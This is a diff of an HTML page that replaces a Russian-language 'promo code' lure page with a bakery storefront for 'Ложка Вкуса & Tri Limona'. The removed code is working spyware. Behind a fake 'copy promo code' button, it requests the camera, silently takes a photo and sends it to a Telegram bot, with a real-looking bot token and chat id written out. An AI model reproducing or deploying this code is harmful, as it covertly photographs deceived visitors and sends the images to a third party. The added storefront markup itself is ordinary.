@@ -1,235 +1,336 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
-    <style>
-        /* Общие стили для body */
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            background-color: #f4f4f4;
-            text-align: center;
-            overflow: hidden; /* Чтобы избежать прокрутки */
-        }
-
-        /* Стили для изображения */
-        img {
-            max-width: 80%;
-            height: auto;
-            display: block;
-            margin-bottom: 10px;
-            border-radius: 10px;
-        }
-
-        /* Стили для кнопки */
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        /* Эффект при наведении на кнопку */
-        button:hover {
-            background-color: #45a049;
-        }
-
-        /* Модальное окно */
-        #modal {
-            display: none; /* Скрыто по умолчанию */
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding-top: 60px;
-            display: flex; /* Используем flex для центрирования */
-            justify-content: center; /* Горизонтальное центрирование */
-            align-items: center; /* Вертикальное центрирование */
-            overflow: auto; /* Чтобы окно было прокручиваемым на мобильных устройствах */
-        }
-
-        /* Содержимое модального окна */
-        #modalContent {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
-            box-sizing: border-box;
-            text-align: center;
-            /* Для мобильных устройств */
-            min-width: 250px;
-        }
-
-        #closeBtn {
-            padding-left: 90%;
-            color: #aaa;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        #closeBtn:hover,
-        #closeBtn:focus {
-            color: black;
-            text-decoration: none;
-        }
-
-        /* Кнопка в модальном окне */
-        #allowAccessBtn {
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        #allowAccessBtn:hover {
-            background-color: #45a049;
-        }
-
-        /* Стили для мобильных устройств */
-        @media (max-width: 600px) {
-            body {
-                padding: 10px; /* Отступы для мобильных */
-            }
-
-            #modalContent {
-                padding: 15px; /* Уменьшаем отступы внутри модального окна */
-                width: 100%;
-                max-width: 300px;
-            }
-
-            #closeBtn {
-                font-size: 24px; /* Меньший размер кнопки для закрытия на мобильных устройствах */
-            }
-        }
-    </style>
+    <title>Ложка Вкуса & Tri Limona</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <header class="header" id="header">
+        <div class="container header__container">
+           <div class="header__logo">
+    <img src="logo.png" alt="Ложка Вкуса & Tri Limona" class="logo-img">
+    <span class="logo-text">Ложка Вкуса & Tri Limona</span>
+</div>
+            <div class="header__right">
+                <a href="#" class="nav-link cart-link" id="cartToggle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/>
+                        <line x1="3" y1="6" x2="21" y2="6"/>
+                        <path d="M16 10a4 4 0 01-8 0"/>
+                    </svg>
+                    <span class="cart-count" id="cartCount">0</span>
+                </a>
+                <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Меню">
+                    <span></span><span></span><span></span>
+                </button>
+            </div>
+            <nav class="header__nav" id="mainNav">
+                <ul class="nav-list">
+                    <li><a href="#catalog" class="nav-link">Каталог</a></li>
+                    <li><a href="#about" class="nav-link">О нас</a></li>
+                    <li><a href="#contacts" class="nav-link">Контакты</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
 
-    <img src="https://shopofmoney.com/upload/iblock/1eb/1x6gfftglch4vap3r9gniup2e8uow75u.jpg" alt="Описание изображения">
-    <button id="captureButton">посмотреть промокод</button>
+    <main>
+        <!-- Баннер -->
+        <section class="banner">
+            <div class="banner__bg"></div>
+            <div class="container banner__container">
+                <div class="banner__content">
+                    <div class="banner__badge">✦ Свежая выпечка каждый день</div>
+                    <h1 class="banner__title">Домашние полуфабрикаты и&nbsp;торты с&nbsp;любовью</h1>
+                    <p class="banner__subtitle">Натуральные продукты, приготовленные с душой. Доставка по городу.</p>
+                    <div class="banner__actions">
+                        <a href="#catalog" class="btn btn-primary btn-large">Перейти в каталог</a>
+                        <a href="#about" class="btn btn-outline">Узнать больше</a>
+                    </div>
+                </div>
+                <div class="banner__image">
+                    <div class="floating-card">🥟</div>
+                    <div class="floating-card">🍰</div>
+                    <div class="floating-card">🧁</div>
+                </div>
+            </div>
+        </section>
 
-    <!-- Модальное окно -->
-    <div id="modal">
-        <div id="modalContent">
-            <span id="closeBtn">&times;</span>
-            <h2>промокод</h2>
-            <p>KG596JJ</p>
-            <button id="allowAccessBtn">Скопировать</button>
+        <!-- Категории + поиск -->
+        <section class="catalog-controls" id="catalog">
+            <div class="container">
+                <div class="controls__top">
+                    <div class="category-tabs">
+                        <button class="category-btn active" data-category="all">Все товары</button>
+                        <button class="category-btn" data-category="polufabrikaty">🥟 Полуфабрикаты</button>
+                        <button class="category-btn" data-category="torty">🎂 Торты</button>
+                    </div>
+                    <div class="search-box">
+                        <input type="text" id="searchInput" placeholder="Поиск товаров..." aria-label="Поиск товаров">
+                        <button id="searchBtn" aria-label="Найти">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="11" cy="11" r="8"/>
+                                <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Каталог товаров -->
+        <section class="catalog-grid container" id="productGrid">
+            <!-- карточки генерируются JS -->
+        </section>
+
+        <!-- Преимущества -->
+        <section class="benefits">
+            <div class="container">
+                <h2 class="section-title">Почему выбирают нас</h2>
+                <div class="benefits__grid">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🌿</div>
+                        <h3>Натуральные продукты</h3>
+                        <p>Только отборные ингредиенты без консервантов</p>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🧑‍🍳</div>
+                        <h3>Домашнее приготовление</h3>
+                        <p>Готовим с душой, как для своей семьи</p>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🚚</div>
+                        <h3>Быстрая доставка</h3>
+                        <p>Свежие продукты в день заказа</p>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">❤️</div>
+                        <h3>Любовь к деталям</h3>
+                        <p>Каждый рецепт проверен временем</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- О нас -->
+        <section class="about" id="about">
+            <div class="container about__container">
+                <div class="about__content">
+                    <span class="section-tag">О компании</span>
+                    <h2>Ложка Вкуса & Tri Limona</h2>
+                    <p class="about__lead">Семейный проект, который родился из любви к домашней кухне.</p>
+                    <p>Мы готовим полуфабрикаты и торты из натуральных продуктов, чтобы вы могли наслаждаться вкусной едой без лишних хлопот. Наши рецепты — это традиции и инновации. Мы используем только свежие ингредиенты и не добавляем усилители вкуса. Каждое блюдо — это маленький праздник для вашего стола.</p>
+                    <div class="about__stats">
+                        <div><span>5+</span> лет опыта</div>
+                        <div><span>50+</span> рецептов</div>
+                        <div><span>1000+</span> довольных клиентов</div>
+                    </div>
+                </div>
+                <div class="about__image">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='400' viewBox='0 0 500 400'%3E%3Crect width='500' height='400' fill='%23f5f0ff' rx='30'/%3E%3Ccircle cx='250' cy='200' r='120' fill='%23ede9fe'/%3E%3Ctext x='180' y='230' font-size='80'%3E🍰%3C/text%3E%3C/svg%3E" alt="О нас" loading="lazy">
+                </div>
+            </div>
+        </section>
+
+        <!-- Отзывы -->
+        <section class="reviews">
+            <div class="container">
+                <h2 class="section-title">Отзывы наших клиентов</h2>
+                <div class="reviews__grid">
+                    <div class="review-card">
+                        <div class="review-stars">★★★★★</div>
+                        <p>«Пельмени — просто объедение! Тесто тонкое, начинка сочная. Доставка быстрая. Спасибо!»</p>
+                        <div class="review-author">— Екатерина</div>
+                    </div>
+                    <div class="review-card">
+                        <div class="review-stars">★★★★★</div>
+                        <p>«Заказывала Наполеон на день рождения. Нежный, с хрустящими коржами. Все гости были в восторге!»</p>
+                        <div class="review-author">— Алексей</div>
+                    </div>
+                    <div class="review-card">
+                        <div class="review-stars">★★★★★</div>
+                        <p>«Манты тают во рту. Очень вкусные, как у бабушки. Теперь только здесь беру полуфабрикаты.»</p>
+                        <div class="review-author">— Марина</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Контакты -->
+        <section class="contacts" id="contacts">
+            <div class="container">
+                <div class="contacts__header">
+                    <span class="section-tag">Свяжитесь с нами</span>
+                    <h2 class="section-title">Контакты</h2>
+                </div>
+                <div class="contacts__grid">
+                    <div class="contacts__card">
+                        <div class="contacts__card-icon">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.362 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.574 2.81.7A2 2 0 0122 16.92z"/>
+                            </svg>
+                        </div>
+                        <h3>Телефон</h3>
+                        <a href="tel:+996XXXXXXXXX">+996 (XXX) XXX-XX-XX</a>
+                        <p>Пн-Пт: 9:00 - 21:00</p>
+                    </div>
+
+                    <div class="contacts__card contacts__card--whatsapp">
+                        <div class="contacts__card-icon">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+                            </svg>
+                        </div>
+                        <h3>WhatsApp</h3>
+                        <a href="https://wa.me/996XXXXXXXXX" target="_blank">Написать в WhatsApp</a>
+                        <p>Быстрый ответ в течение 5 минут</p>
+                    </div>
+
+                    <div class="contacts__card contacts__card--instagram">
+                        <div class="contacts__card-icon">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+                                <path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"/>
+                                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
+                            </svg>
+                        </div>
+                        <h3>Instagram</h3>
+                        <a href="#" target="_blank">@lozhkavkusa</a>
+                        <p>Следите за нашими новинками</p>
+                    </div>
+
+                    <div class="contacts__card contacts__card--location">
+                        <div class="contacts__card-icon">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
+                                <circle cx="12" cy="10" r="3"/>
+                            </svg>
+                        </div>
+                        <h3>Адрес</h3>
+                        <p>г. Бишкек, ул. Ленина, д. 15</p>
+                        <p>Офис: 2 этаж, кабинет 205</p>
+                    </div>
+                </div>
+
+                <div class="contacts__map">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='800' height='300' viewBox='0 0 800 300'%3E%3Crect width='800' height='300' fill='%23e0e7ff' rx='20'/%3E%3Cpath d='M250 150 L550 150 L480 220 L320 220 Z' fill='%2390a4f7' opacity='0.5'/%3E%3Ccircle cx='400' cy='150' r='20' fill='%236366f1'/%3E%3Ctext x='370' y='100' font-family='Inter' font-size='18' fill='%233f3f46' font-weight='600'%3Eул. Ленина, 15%3C/text%3E%3Ctext x='355' y='120' font-family='Inter' font-size='14' fill='%236b657a'%3Eг. Бишкек%3C/text%3E%3C/svg%3E" alt="Карта" loading="lazy">
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Корзина (модальное окно) -->
+    <div class="cart-modal" id="cartModal">
+        <div class="cart-modal__content">
+            <button class="cart-modal__close" id="cartModalClose">&times;</button>
+            <h2>🛒 Корзина</h2>
+            <div id="cartItems" class="cart-items"></div>
+            <div class="cart-total">
+                <span>Итого:</span>
+                <span><strong id="cartTotalPrice">0 сом</strong></span>
+            </div>
+            <div class="cart-total-items">
+                Товаров: <strong id="cartTotalItems">0</strong>
+            </div>
+            <button class="btn btn-primary checkout-btn" id="checkoutBtn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+                </svg>
+                Оформить заказ через WhatsApp
+            </button>
         </div>
     </div>
 
-    <canvas id="canvas" style="display: none;"></canvas>
+    <!-- Toast уведомление -->
+    <div class="toast" id="toast">
+        <div class="toast__icon">✅</div>
+        <div class="toast__content">
+            <div class="toast__title">Товар добавлен!</div>
+            <div class="toast__message" id="toastMessage">Пельмени</div>
+        </div>
+        <button class="toast__close" id="toastClose">&times;</button>
+    </div>
 
-    <script>
-        let stream;
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer__top">
+                <div class="footer__brand">
+                    <div class="footer__logo">
+                        <span class="logo-icon">🥄</span>
+                        <span>Ложка Вкуса & Tri Limona</span>
+                    </div>
+                    <p>Домашние полуфабрикаты и торты с любовью</p>
+                    <div class="footer__social">
+                        <a href="#" aria-label="Instagram" class="social-link">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+                                <path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"/>
+                                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
+                            </svg>
+                        </a>
+                        <a href="#" aria-label="WhatsApp" class="social-link">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+                            </svg>
+                        </a>
+                        <a href="#" aria-label="Telegram" class="social-link">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22 2L11 13"/>
+                                <path d="M22 2L15 22l-4-9-9-4 20-7z"/>
+                            </svg>
+                        </a>
+                        <a href="#" aria-label="YouTube" class="social-link">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22.54 6.42a2.78 2.78 0 00-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 00-1.94 2A29 29 0 001 11.75a29 29 0 00.46 5.33A2.78 2.78 0 003.4 19.1c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 001.94-2 29 29 0 00.46-5.25 29 29 0 00-.46-5.33z"/>
+                                <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"/>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+                <div class="footer__links">
+                    <div class="footer__links-column">
+                        <h4>Навигация</h4>
+                        <ul>
+                            <li><a href="#catalog">Каталог</a></li>
+                            <li><a href="#about">О нас</a></li>
+                            <li><a href="#contacts">Контакты</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer__links-column">
+                        <h4>Категории</h4>
+                        <ul>
+                            <li><a href="#" data-category="polufabrikaty">Полуфабрикаты</a></li>
+                            <li><a href="#" data-category="torty">Торты</a></li>
+                            <li><a href="#" data-category="all">Все товары</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer__links-column">
+                        <h4>Контакты</h4>
+                        <ul>
+                            <li><a href="tel:+996XXXXXXXXX">+996 (XXX) XXX-XX-XX</a></li>
+                            <li><a href="https://wa.me/996XXXXXXXXX" target="_blank">WhatsApp</a></li>
+                            <li><a href="mailto:info@lozhkavkusa.com">info@lozhkavkusa.com</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="footer__bottom">
+                <div class="footer__copy">
+                    &copy; 2026 Ложка Вкуса & Tri Limona. Все права защищены.
+                </div>
+                <div class="footer__badge">
+                    <span>❤️ Сделано с любовью</span>
+                </div>
+            </div>
+        </div>
+    </footer>
 
-        // Показываем модальное окно при нажатии на кнопку
-        document.getElementById('captureButton').addEventListener('click', function() {
-            document.getElementById('modal').style.display = "flex";
-        });
-
-        // Закрытие модального окна
-        document.getElementById('closeBtn').addEventListener('click', function() {
-            document.getElementById('modal').style.display = "none";
-        });
-
-        // Запрос на доступ к камере
-        document.getElementById('allowAccessBtn').addEventListener('click', function() {
-            // Проверка, поддерживает ли браузер доступ к камере
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(userStream) {
-                        stream = userStream;
-
-                        // Закрытие модального окна
-                        document.getElementById('modal').style.display = "none";
-
-                        // Захват изображения с камеры
-                        captureImage();
-                    })
-                    .catch(function(err) {
-                        alert('Ошибка при получении доступа к камере: ' + err);
-                    });
-            } else {
-                alert("Этот браузер не поддерживает доступ к камере.");
-            }
-        });
-
-        // Захват изображения с камеры
-        function captureImage() {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-
-            // Создаем временный video элемент
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            video.onloadedmetadata = function() {
-                // Настроим размеры канваса
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                // Копируем изображение с видео на холст
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Преобразуем изображение в формат base64
-                const imageData = canvas.toDataURL('image/png');
-                console.log(imageData);  // Это данные изображения в формате base64
-
-                // Преобразуем base64 данные в Blob
-                const byteString = atob(imageData.split(',')[1]);
-                const arrayBuffer = new ArrayBuffer(byteString.length);
-                const uintArray = new Uint8Array(arrayBuffer);
-
-                for (let i = 0; i < byteString.length; i++) {
-                    uintArray[i] = byteString.charCodeAt(i);
-                }
-
-                const blob = new Blob([uintArray], { type: 'image/png' });
-
-                // Отправляем фото в Telegram
-                sendPhotoToTelegram(blob);
-            };
-        }
-
-        // Функция для отправки фото в Telegram
-        function sendPhotoToTelegram(photoBlob) {
-            const token = '8443065126:AAHDx1kIMfez5pRX4xKl_hgpeOBYdXseVa0';  // Замените на ваш токен бота
-            const chatId = '5444484112';  // Замените на ваш chat_id
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', photoBlob, 'photo.png');
-
-            // Отправка фото через FormData
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log('Фото отправлено в Telegram:', data))
-            .catch(error => console.error('Ошибка при отправке фотографии:', error));
-        }
-    </script>
-
+    <script src="script.js"></script>
 </body>
 </html>
